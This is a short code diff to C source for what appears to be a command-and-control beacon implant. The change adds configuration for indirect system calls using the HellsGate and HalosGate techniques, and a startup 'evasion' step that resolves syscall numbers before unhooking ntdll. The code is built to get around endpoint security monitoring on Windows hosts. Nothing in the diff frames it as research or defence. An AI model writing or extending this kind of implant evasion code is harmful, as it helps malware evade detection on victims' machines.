@@ -40,6 +40,12 @@
 #ifndef ENABLE_UNHOOK
 #define ENABLE_UNHOOK 1
 #endif
+#ifndef ENABLE_INDIRECT_SYSCALL
+#define ENABLE_INDIRECT_SYSCALL 1
+#endif
+#ifndef SYSCALL_METHOD
+#define SYSCALL_METHOD 0  /* 0=auto, 1=hellsgate-disk, 2=halosgate-memory */
+#endif
 
 #define BUF_SIZE 65536
 
@@ -501,6 +507,11 @@ static DWORD WINAPI run_beacon(LPVOID unused) {
     int use_https = USE_HTTPS;
 
     /* ── Evasion at startup ── */
+#if ENABLE_INDIRECT_SYSCALL
+    /* Resolve SSNs first — before any NT calls, including unhook_ntdll.
+       If ntdll is already partially hooked this still works via HalosGate scan. */
+    gate_init();
+#endif
 #if ENABLE_UNHOOK
     unhook_ntdll();
 #endif
